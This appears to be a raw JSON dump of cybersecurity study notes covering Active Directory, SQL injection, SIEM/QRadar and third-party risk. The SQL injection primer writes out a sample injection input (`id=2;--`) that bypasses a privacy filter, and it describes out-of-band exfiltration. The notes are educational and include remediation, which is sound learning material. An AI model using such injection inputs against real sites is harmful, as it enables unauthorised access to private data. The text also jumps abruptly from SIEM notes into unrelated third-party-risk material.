Trusts\n\nTrusts are mechanisms in place for users in the network to gain access to other resources in the domain. Trusts outline how domains inside of a forest communicate to each other, and some can be extended to external domains and forests in some cases.\n\n- **Directional** - The direction of the trust flows from a trusting domain to a trusted domain\n- **Transitive** - Trust relationship expands beyond two domains to include other trusted domains\n\n### Domain Policies\n\nPolicies dictate how the server updates and what rules it will and will not follow. They act as a rule book for Active Directory that a domain admin can modify and alter as necessary to keep the network running smoothly and securely.\n\n- Disable Windows Defender - Disables windows defender across all machine on the domain\n- Digitally Sign Communication (Always) - Disable or enable SMB signing on the domain controller\n\n## Active Directory Domain Services + Authentication\n\nThe Active Directory domain services are the core functions of an Active Directory network.\n\nThey allow for management of the domain, security certificates, LDAPs, and much more.\n\n### Domain Services\n\nServices that the domain controller provides to the rest of the domain or tree. There is a wide range of various services that can be added to a domain controller.\n\nThe default domain services:\n\n**LDAP** - Lightweight Directory Access Protocol provides communication between applications and directory services.\n\n**Certificate Services** - Allows the domain controller to create, validate, and revoke public key certificates.\n\n**DNS, LLMNR, NBT-NS** - Domain Name Services for identifying IP hostnames\n\n### Domain Authentication\n\nThere are two types of main types of authentication in place for Active Directory: NTLM and Kerberos.\n\n- **Kerberos** - The default authentication service for Active Directory uses ticket-granting tickets and service tickets to authenticate users and give users access to other resources across the domain.\n\n**NTLM** - Default Windows authentication protocol uses an encrypted challenge/response protocol\n\nThe Active Directory domain services are the main access point for attackers and contain some of the most vulnerable protocols for Active Directory.\n\n## Active Directory in the Cloud\n\nCompanies have been shifting Active Directory to cloud networks.\n\n### Azure AD\n\nAzure is the most notable cloud provider and its default settings are much more secure than an on-premise physical Active Directory network; however the cloud AD may still have vulnerabilities.\n\nAzure acts as the middle man between physical Active Directory and users' sign on.\n\n### Cloud Security\n\nA comparison table with a cloud Active Directory environment and a physical network.\n\n\n| Windows Server AD | Azure AD |\n| ----------------- | -------- |\n| LDAP                | Rest APIs\n| NTLM                | OAuth/SAML      \n| Kerberos            | OpenID     \n| OU Tree             | Flat Structure\n| Domains and Forests | Tenants\n| Trusts              | Guests\n\n## Active Directory Commands\n\nhttps://activedirectorypro.com/powershell-commands/\n\n","n":0.029}}},{"i":82,"$":{"0":{"v":"SQL-Injection","n":1},"1":{"v":"\n# What is SQL?\n\nSQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed.\n\n- When a web application communicates with a database using input from a user that has not been properly validated, there is potential of an attacker being able to steal, delete or alter private and customer data.\n\n## What is a Database?\n\nA database is a way of electronically storing collections of data in an organized manner. A database is controlled by a DBMS (Database Management System) and is **Relational** or **Non-Relational**.\n\n![database](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/f31d5855476c01e8359df000da4ac79d.png)\n\nWithin a DBMS, you can have multiple databases, each containing its own set of related data.\n\n- A database called 'shop' to store information about products available to purchase, users who signed up, and information about the orders received. This information is stored as tables and each are identified with a unique name.\n\n### What is a Table?\n\nA table is made up of columns and rows. A table is like a grid with the columns going across the top from left to right containing the name of the cell and the rows going from top to bottom with each one having data.\n\n![table](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/cee2844345f5ab5bc704b163797b3604.png)\n\n**Columns:** Referred to as a field has a unique name per table. When creating a column, the type of data could be set as integer (numbers), strings (standard text) or dates. Some databases can contain much more complex data, such as geo location data.\n\n- Setting the data type also ensures that incorrect information is not stored, such as the string \"hello world\" being stored in a column meant for dates. If this happens, an error message is produced.\n- Each row of data create a key field that has to be unique for every row of data which can be used to find that exact row in SQL queries.\n\n**Rows**: Rows or records are what contains the individual lines of data. When adding data to the table, a new row/record is created and removed when data is deleted.\n\n### Relational vs Non-Relational Databases\n\nA relational database, stores information in tables and have shared information between them - Columns are used to specify and define the data being stored and rows to store the data.\n\n- The tables often contain a column with a unique ID (primary key) which is then used in other tables to reference it and cause a relationship between the tables.\n\nNon-relational databases sometimes called NoSQL is any database that does not use tables, columns and rows to store the data - Specific database layout does not need to be constructed so each row of data can contain different information which can provide more flexibility over a relational database.\n\n- Popular non-relational databases are MongoDB, Cassandra and ElasticSearch.\n\n## What is SQL Injection?\n\nThe point where a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.\n\nIn the following scenario, the blog entries may be either set to public or private depending on whether they are ready for public release. The URL for each blog entry may look like something: `https://website.thm/blog?id=1`\n\nFrom the URL, the blog entry has been selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like: `SELECT * from blog where id=1 and private=0 LIMIT 1;`\n\nNow pretend article id 2 is still locked as private, so it cannot be viewed on the website: `https://website.thm/blog?id=2;--`\n\n- The SQL statement would be `SELECT * from blog where id=2 and private=0 LIMIT 1;`\n- The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as comment (`SELECT * from blog where id=2;--`).\n  - This will return the article with an id of 2 whether it is set to public or not.\n- This is one example of an SQL Injection vulnerability of a type called In-Band SQL Injection.\n  - There are 3 types in total: In-Band, Blind and Out of Band.\n\n## In-Band SQL Injection\n\nIn-Band SQL injection is the easiest type to detect and exploit; In-Band refers to the same method of communication being used to exploit the vulnerability and also receive the results. For example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.\n\n**Error-Based SQL Injection**: Type of injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen.\n\n**Union-Based SQL Injection**: Utilizes the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.\n\n## Out-of-Band SQLi\n\nIs not as common as it depends on specific features being enabled on the database server or the web application's business logic.\n\nAn Out-of-Band attack is classified by having two different communication channels with one to launch an attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.\n\n1. An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.\n2. The website makes an SQL query to the database which also passes the hacker's payload.\n3. The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.\n\n## Remediation\n\nDevelopers have a way to protect their web applications from them by following the below advice:\n\n- **Prepared Statements (With parameterized queries)**: The developer writes the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure does not change and the database can distinguish between the query and the data.\n- **Input Validation**: Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters to allow or disallow.\n- **Escaping User Input**: Method of pre-pending a backslash (\\) to these characters, which then causes them to be parsed just as a regular string and not a special character.","n":0.031}}},{"i":83,"$":{"0":{"v":"SIEM","n":1},"1":{"v":"\n# SIEM Concepts\n\n- [ ] Explore and understand the key terms of SIEM.\n- [ ] Explore the role of a SIEM in the network.\n- [ ] Understand the role of a SIEM in modern SOC.\n\n- [ ] Explore different SIEM vendors and their components.\n\n- [ ] Deep drive of QRadar from a Security Analysts point of view.\n\n- [ ] Describe User Behavior Analytics (UBA) use cases.\n---\n\n## SIEM\n\nSIEM (System Information Event Management)\n: A data aggregator, search, and reporting system. SIEM gathers immense amounts of data from entire networked environment, consolidates and makes that data human accessible. With the data categorized and laid out, you can research data security breaches with as much detail as needed.\n\nKey Terms:\n\n- Log Collection\n- Normalization\n- Correlation\n- Aggregation\n- Reporting\n\n1. A SIEM system collects logs and other security-related documentation for analysis.\n2. The core function is to manage network security by monitoring flows and events.\n3. It consolidates log events and network flow data from thousands of devices, endpoints and applications distributed throughout a network. It then uses an advanced Sense Analytics engine to normalize and correlate this data and identifies security offenses requiring investigation.\n4. A SIEM system cane be ruled-based or employ a statistical correlation engine to establish relationships between event log entries.\n5. Capture log event and network flow data in near real time and apply advanced analytics to reveal security offenses.\n6. It can be available on premises and in a cloud environment.\n\n### Events & Flows\n\nEvent\n: Typically a log of a specific action such as a user login, or a FW permit, occurs at a specific time and the event is logged at that time.\n\nFlows\n: A record of network activity between two hosts that can last for seconds to days depending on the activity within the session.\n\n- For example, a web request might download multiple files such as images, ads, video, and last for 5 to 10 seconds, or a user who watches a Netflix movie might be in a network session that last up to a few hours.\n\n### Data Collection\n\nData Collection\n: The process of collecting flows and logs from different sources into a common repository.\n\n- It can be performed by sending data directly into the SIEM or an external device can collect log data from the source and move it into the SIEM system on demand or scheduled.\n- Consider CPU, memory, storage capacity, license, and number of sources.\n\n### Normalization\n\nNormalization\n: Process involves turning raw data into a format that has fields such as IP address that the SIEM can use.\n\n- Normalization involves parsing raw event data and preparing the data to display readable information.\n- Normalization allows for predictable and consistent storage for all records, and indexes those records for fast searching and sorting.\n\n### License Throttling\n\nLicense Throttling\n: Monitors the number of incoming events to the system to mange input queues and EPS licensing.\n\n### Coalescing\n\n- Events are parsed and then coalesced based on common attributes across events.\n  - QRadar: Event coalescing starts after three events have been found with matching properties within a 10 second period.\n- Event data received by QRader is processed in to normalized fields, along with the original payload. Five properties are evaluated:\n  - QID\n  - Source IP\n  - Destination IP\n  - Destination port\n  - Username\n\n### Offenses\n\n#### Event Correlation\n\n- Logs\n- IP Reputation\n- Flows\n- Geo Location\n\n#### Activity Baseline & Anomaly Detection\n\n- User Activity\n- Database Activity\n- Application Activity\n- Network Activity\n\n#### Offense Identification\n\n- Credibility\n- Severity\n\n## SIEM Deployment\n\n### Considerations\n\n- Compliance\n- Cost-Benefit\n- Cybersecurity\n\n### Events\n\nEvent Collector\n: Collects event from local and remote log sources, and normalizes raw log source events to format for use by QRadar. The Event Collector bundles or coalesces identical events to conserve system usage and sends the data to the Event Processor.\n\n- Can use bandwidth limiters and schedules to send events to the Event Processor to overcome WAN limitations such as intermittent connectivity.\n- Bundles or coalesces identical events to conserve system usage and sends the data to the Event Processor.\n\nEvent Processor\n: Processes events that are collected from one or more Event Collector components.\n\n- Processes event by using the Custom Rules Engine (CRE).\n\n### Flows\n\nFlow Collector\n: Generates flow data from raw packets that are collected from monitor ports such as SPANs, TAPs and monitor sessions, or from external flow sources such as netflow, sflow, jflow.\n\n- Data is then converted to QRadar flow format and sent down the pipeline for processing.\n\n#### Flow Processor\n\nFlow De-duplication\n: A process that removes duplicate flows when multiple Flow Collectors provide data to Flow Processors appliances.\n\nAsymmetric Recombination\n: Responsible for combining two sides of each flow when data is provided asymmetrically. This process can recognize flows from each side and combine them in to one record. However, sometimes only one side of the flow exists.\n\nLicense Throttling\n: Monitors the number of incoming flows to the system to manage input queues and licensing.\n\nForwarding\n: Applies routing rules for the system, such as sending flow data to offsite targets, external Syslog systems, JSON systems, and other SIEMs.\n\n### Reasons to Add Event or Flow Collectors to All-in-One Deployment\n\n- Data collection requirements exceed the collection capability of processor.\n- Must collect events and flows at a different location than processor is installed.\n- Monitoring packet-based flow sources.\n- As deployment grows, the workload exceeds the processing capacity of the All-in-One appliance.\n- Security operations center employs more analysts who do more concurrent searches.\n- The types of monitored data, and the retention period for that data increases, which increases processing and storage requirements.\n- As security analyst team grows, requires better search performance.\n\n### Security Operations Center (SOC)\n\nTriad of security operations: People, Process and Technology\n\n![SOC](https://lh3.googleusercontent.com/XkV9_pyKmRnuXUzAFDdFggJIad1YDxzfoVf9grhfqKJNXEDqMttRH0792TeKZjEyP0ZLK_WOz-r8kNrjUBCgv5s1JvnvhoQ-9rZ_rdjcHkUkpjGBAACeS928xGryEycAV9POW8f8l8Ub4iFAvQ)\n\n## SIEM Solutions - Vendors\n\n> The security information and event management (SIEM) market is defined by customers' need to analyze security event data in real time, which supports the early detection of attacks and breaches.

This includes: \n\n- Data management companies\n- Law firms\n- Email providers\n- Web hosting companies\n- Vendors\n- Subcontractors\n\n## Quick Stats\n\n- $2.1 million is the average annual spend on vetting third parties &rarr; 64% say the processes used are only somewhat or not effective.\n- 40% of organizations use manual procedures, like spreadsheets and 51% employ risk scanning tools, to vet their third parties &rarr; 34% said results of these tools are only somewhat valuable while 20% said results don't provide any insights.\n- Third parties are spending 15,000 hours a year on completing assessments, at ana average cost of $1.9 million annually &rarr; Over 55% said these assessments only somewhat or not accurately reflect their security posture.\n- Only 8% of assessments result in action (eg. disqualification of a vendor or a requirement to remediate gaps) &rarr; If assessments revealed gaps, only 26% of respondents say their organizations terminated the relationship.\n\n## Types of Breaches\n\n### Cloud-Based\n\n### Payment\n\n### JavaScript Library\n\n## Cyber Supply Chain Risks\n\nWhen companies began extensively outsourcing and globalizing the supply chain in the 1980's and 1990's, they did so without understanding the risks suppliers posed...Lack of physical or cybersecurity at supplier sites could result in a breach of corporate data systems or product corruption.\n\n- Personnel in supplier companies that have access to the data, systems or facilities of their customers.\n- Any service provider-from janitorial services to system maintenance- or any provider with access to company information poses a potential cyber risk.\n- Products with embedded IT that will be integrated into their customer's systems.\n\n## NIST Supply Chain Risk Management (SCRM) Guidance\n\nA primary objective of cyber SCRM is to identify, assess, and mitigate products and services that may contain potentially malicious functionality, are counterfeit, or are vulnerable due to poor manufacturing and development practices within the cyber supply chain. Cyber SCRM activities may include:\n\n- Determining cybersecurity requirements for suppliers.\n- Enacting cybersecurity requirements through formal agreement.\n- Communicating to suppliers how those cybersecurity requirements will be verified and validated.\n- Verifying that cybersecurity requirements are met through a variety of assessment methodologies.  \n- Governing and managing all the above.\n\n## Best Practices\n\nEvaluation\n: of the security and privacy practices of all third parties - Conduct regular audit and assessments to evaluate security and privacy practices of third parties.\n\nInventory\n: All third parties that have shared information - Track all third parties that have access to sensitive data and how many of these parties are sharing this data with others.\n\nFrequent\n: Review third-party management policies and programs - Implement formal processes to regularly evaluate security and privacy practices of third and nth parties to address new technologies and innovations.\n\n3rd Party Notification\n: Mandate that third parties provide information and transparency into their party relationships prior to sharing sensitive data.\n\nOversight\n: Involve senior leadership and boards of directors in third-party risk management programs. High-level attention to third-party risk may increase the budget available to address these threats.\n\n## 3rd Party Impacts\n\n[Third-party breaches remain a dominant security challenge for organizations, with over 63% 1 of breaches linked to a third party. To prevent or mitigate the severity of a third-party data breach or cyber exploit, organizations can implement a variety of cybersecurity risk management controls such as assessing compliance with regulations, vetting third-party security practices and establishing data breach and cyber exploit incident response procedures.](https://info.cybergrx.com/hubfs/Content-Assets/CyberGRX%20Ponemon%20Report.pdf)\n\n### Industry Quick Facts\n\n- Financial services reported the second most third-party breaches despite their third parties spending the most time on assessments (over 17,000 hours/year).\n- Health & Pharmaceuticals less likely to have a third-party breach and most likely to use a combination of tools to assess third parties.\n- Public sector use a combination of tools to assess third parties and tend to believe their results are valuable.\n- Retail reported the most third-party data breaches despite their third parties spending over 16,578 hours on assessments.\n- Technology & software most likely to have multiple third-party data breaches, and over 41% still use manual procedures to assess third parties.\n\n### Key Findings\n\n- Third party breaches remain an expensive problem.\n- IT security professionals still believe their TPCRM programs are immature.\n- Using a combination of automated tools provides better results.\n- Risk prioritization processes are viewed as critical, but current processes are ineffective.\n- If third-party security gaps are discovered, organizations are not proactive in mitigating these risks.\n- No one function controls the budget for third-party cyber risk management programs (TPCRM).\n- Investing in better assessment and vetting tools can increase effectiveness in TPCRM while decreasing the cost of maintaining the program.\n- There is a massive disparity between the resources invested (both human and financial) and the value received from today's approach to TPCRM.\n\n### Consumer Impact\n\n#### Loss of Trust and Business\n\n- 65% of data breach victims lost trust in an organization.\n- 80% of consumers will defect from a business if their information is compromised in a breach.\n\n#### Negative Word of Mouth\n\n- 85% tell others about their experience.\n- 33.5% use social media to complain about their experience.\n- 20% comment directly on the company's website.\n\n#### Lose Out to Competitors\n\n- 52% of consumers would consider paying for the same products or services from a provider with better security.\n- 52% of consumers said security is an important or main consideration when purchasing products or services.\n","n":0.033}}}]}
